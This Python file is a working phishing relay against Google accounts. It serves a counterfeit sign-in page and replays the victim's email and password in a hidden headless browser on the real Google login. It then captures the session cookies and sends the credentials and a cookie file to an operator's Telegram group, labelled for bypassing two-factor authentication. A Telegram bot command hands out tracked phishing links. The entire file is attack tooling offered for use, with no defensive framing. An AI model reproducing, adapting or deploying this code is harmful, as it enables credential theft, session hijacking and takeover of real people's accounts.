import os
import json
import asyncio
import telebot
from quart import Quart, render_template, request, redirect, Response
from playwright.async_api import async_playwright
from threading import Thread

# --- CONFIGURATION ---
# These must be set in your Koyeb Environment Variables
BOT_TOKEN = os.environ.get("BOT_TOKEN")
GROUP_ID = int(os.environ.get("GROUP_ID", 0))
BASE_URL = os.environ.get("BASE_URL", "").rstrip('/')

bot = telebot.TeleBot(BOT_TOKEN)
app = Quart(__name__)

# Dictionary to store active browser sessions for each user (TID)
# This prevents opening 100 browsers and crashing Koyeb RAM
user_sessions = {}

async def get_browser_context(tid):
    """ Initializes or retrieves a real-time browser session for a specific target """
    if tid not in user_sessions:
        playwright = await async_playwright().start()
        # Launching with stealth arguments to bypass Google Bot Detection
        browser = await playwright.chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
        )
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        )
        page = await context.new_page()
        user_sessions[tid] = {
            "playwright": playwright,
            "browser": browser,
            "page": page,
            "context": context
        }
    return user_sessions[tid]

# --- WEB ROUTES ---

@app.route('/')
async def index():
    """ The entry point: Mirrors the real Google Sign-in Page """
    tid = request.args.get('tid', 'Unknown')
    
    # Notify Master Log that someone clicked the link
    bot.send_message(GROUP_ID, f"👀 **Link Opened**\n🆔 Target ID: `{tid}`", parse_mode="Markdown")
    
    # Start the hidden browser session
    session = await get_browser_context(tid)
    page = session["page"]
    
    # Go to the REAL Google Sign-in
    await page.goto("https://accounts.google.com/signin", timeout=60000)
    
    # Send the real Google HTML to the user's browser
    # Note: For a true 100% mirror, we serve our 'google.html' which looks exactly like the source you provided
    return await render_template('google.html', tid=tid)

@app.route('/login', methods=['POST'])
async def login():
    """ Captures data and mirrors it to the real Google session in real-time """
    form_data = await request.form
    email = form_data.get('identifier')
    password = form_data.get('password')
    tid = form_data.get('tid')

    session = await get_browser_context(tid)
    page = session["page"]
    context = session["context"]

    try:
        # STEP 1: Mirror Email Input
        await page.fill('input[type="email"]', email)
        await page.click('#identifierNext')
        await asyncio.sleep(2) # Natural pause for Google's animation

        # STEP 2: Mirror Password Input
        await page.fill('input[type="password"]', password)
        await page.click('#passwordNext')
        
        # STEP 3: Wait for Login Success or 2FA Challenge
        # We wait for the URL to change to the Account dashboard
        try:
            await page.wait_for_url("**/myaccount**", timeout=15000)
            status = "✅ **LOGIN SUCCESS (COOKIES CAPTURED)**"
        except:
            status = "🟡 **LOGIN PENDING (POSSIBLE 2FA REQUIRED)**"

        # STEP 4: Capture Session Cookies
        cookies = await context.cookies()
        cookie_file = f"session_{tid}.json"
        
        with open(cookie_file, "w") as f:
            json.dump(cookies, f, indent=2)

        # STEP 5: Send Master Log Report
        log_msg = (
            f"{status}\n"
            f"━━━━━━━━━━━━━━━\n"
            f"👤 **Email:** `{email}`\n"
            f"🔑 **Pass:** `{password}`\n"
            f"🆔 **TID:** `{tid}`\n"
            f"━━━━━━━━━━━━━━━"
        )
        bot.send_message(GROUP_ID, log_msg, parse_mode="Markdown")
        
        with open(cookie_file, "rb") as f:
            bot.send_document(GROUP_ID, f, caption="🍪 **Import these cookies to bypass 2FA.**")

        # Cleanup file after sending
        os.remove(cookie_file)

    except Exception as e:
        bot.send_message(GROUP_ID, f"❌ **Error during Mirroring:** `{str(e)[:100]}`")

    # Redirect user to the real Google manage account to end the session naturally
    return redirect("https://accounts.google.com/manageaccount")

# --- BOT COMMANDS ---

@bot.message_handler(commands=['link'])
def get_link(m):
    link = f"{BASE_URL}/?tid={m.from_user.id}"
    bot.reply_to(m, f"🔗 **Your Personal Relay Link:**\n`{link}`", parse_mode="Markdown")

@bot.message_handler(commands=['clear'])
def clear_sessions(m):
    """ Command to close all open browsers to save RAM """
    global user_sessions
    for tid in user_sessions:
        asyncio.run(user_sessions[tid]["browser"].close())
    user_sessions = {}
    bot.reply_to(m, "🧹 **All active mirror sessions cleared.**")

# --- EXECUTION ---

def run_bot():
    """ Runs the Telegram Bot on a separate thread """
    bot.infinity_polling()

if __name__ == "__main__":
    # Start the bot thread
    Thread(target=run_bot).start()
    
    # Start the Quart Web Server
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port)
